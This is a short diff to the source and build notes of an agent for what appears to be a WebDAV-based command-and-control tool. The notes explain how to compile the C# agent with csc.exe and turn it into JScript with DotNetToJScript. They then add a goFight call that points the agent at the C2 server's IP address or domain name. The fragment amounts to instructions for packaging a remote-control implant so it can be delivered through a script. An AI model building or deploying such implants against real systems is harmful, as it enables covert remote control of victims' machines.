@@ -9,7 +9,7 @@ A) Targetting framework v2 for compatibility with DotNetToJScript:
 	C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /define:DEBUG /t:library /out:agent_debug.exe agent.cs
 
 	Then use DotNetToJScript (https://github.com/tyranid/DotNetToJScript):
-	DotNetToJScript.exe -c C2_Agent -l JScript agent_framework_v2.dll > webdavc2.js
+	DotNetToJScript.exe -c C2_Agent -l JScript agent.dll > webdavc2.js
 	
 	Then modifiy the webdavc2.js file to add a call to the goFight function:
 	o.goFight("<--- IP ADDRESS OR FQDN OF THE WEBDAVC2 server --->");
@@ -50,7 +50,7 @@ public class C2_Agent
 	}
 	
 	//==================================================================================================
-	// Required for DotNetToJScript
+	// Main function for standalone executable use
 	//==================================================================================================
 	public static void Main(string[] args)
 	{
